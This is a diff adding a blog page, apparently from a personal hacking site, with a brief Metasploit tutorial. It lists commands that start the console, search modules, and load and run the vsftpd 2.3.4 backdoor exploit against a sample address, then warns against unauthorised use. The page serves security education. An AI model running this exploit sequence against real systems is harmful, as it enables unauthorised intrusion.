@@ -1,0 +1,100 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Metasploit Basics — Umar_Hacks</title>
+<meta name="description" content="Metasploit Basics on Umar_Hacks">
+<link rel="canonical" href="https://umar-hacks.example/posts/metasploit-basics/">
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="X-Content-Type-Options" content="nosniff">
+<meta name="color-scheme" content="light dark">
+<link rel="icon" href="/assets/img/icon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/assets/css/styles.css">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self'; connect-src 'self'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests">
+
+<script type="module">
+  import { setActiveNav } from '/assets/js/nav.js';
+  import { setYear } from '/assets/js/footer.js';
+  import { initSearch } from '/assets/js/search.js';
+  import { buildTOC } from '/assets/js/toc.js';
+  import { enableCopy } from '/assets/js/copy.js';
+  import { initTheme } from '/assets/js/theme.js';
+  window.addEventListener('DOMContentLoaded', ()=>{ setActiveNav(); setYear(); initSearch(); buildTOC(); enableCopy(); initTheme(); });
+</script>
+</head>
+<body>
+  <a class="visually-hidden" href="#main">Skip to content</a>
+  <header class="site-header" role="banner">
+    <div class="container" style="display:flex;align-items:center;gap:1rem">
+      <a class="logo" href="/">Umar_Hacks</a>
+      <nav aria-label="Primary" class="primary-nav" style="display:flex;gap:.25rem">
+        <a href="/posts/">Posts</a>
+        <a href="/tags/">Tags</a>
+        <a href="/about/">About</a>
+      </nav>
+      <div style="margin-left:auto;display:flex;gap:.5rem;align-items:center">
+        <a class="btn" href="/search/">Search</a>
+        <button id="theme-toggle" class="icon-btn" aria-label="Toggle dark mode">🌓</button>
+      </div>
+    </div>
+  </header>
+  <main id="main" class="container" tabindex="-1">
+    
+<article class="post">
+  <header>
+    <h1>Metasploit Basics</h1>
+    <p><time datetime="2025-08-12">Aug 12, 2025</time> • 10 min read · Tags: <a href="/tags/metasploit/">metasploit</a>, <a href="/tags/exploitation/">exploitation</a></p>
+    <img src="/assets/img/msf-cover.svg" width="1200" height="630" alt="" loading="eager" fetchpriority="high">
+  </header>
+  <div class="layout">
+    <div class="content">
+      
+<p>Metasploit is a framework for developing, testing, and executing exploits.</p>
+<h2>Start the Console</h2>
+<pre><button class="copy-btn">Copy</button><code>msfconsole</code></pre>
+<h2>Find Modules</h2>
+<pre><button class="copy-btn">Copy</button><code>search ftp</code></pre>
+<h2>Use & Set Options</h2>
+<pre><button class="copy-btn">Copy</button><code>use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 10.10.10.10
+run</code></pre>
+<div class="callout warn"><strong>Warning:</strong> Never run exploits on systems you do not own or administer.</div>
+
+      <nav class="post-nav">
+        <a rel="prev" href="/posts/">← All Posts</a>
+        <a rel="next" href="/posts/">More →</a>
+      </nav>
+    </div>
+    <aside id="toc" aria-label="Table of contents"></aside>
+  </div>
+</article>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Metasploit Basics",
+  "datePublished": "2025-08-12",
+  "dateModified": "2025-08-12",
+  "author": {
+    "@type": "Person",
+    "name": "Umar"
+  },
+  "image": "https://umar-hacks.example/assets/img/msf-cover.svg",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://umar-hacks.example/posts/metasploit-basics/"
+  },
+  "description": "Post on Umar_Hacks"
+}
+</script>
+
+  </main>
+  <footer class="site-footer" role="contentinfo">
+    <nav aria-label="Footer">
+      <a href="/about/">About</a> · <a href="/archives/">Archives</a> · <a href="/tags/">Tags</a>
+    </nav>
+    <small>© <span id="year"></span> Umar_Hacks. Built with HTML, CSS & JS.</small>
+  </footer>
+</body>
+</html>
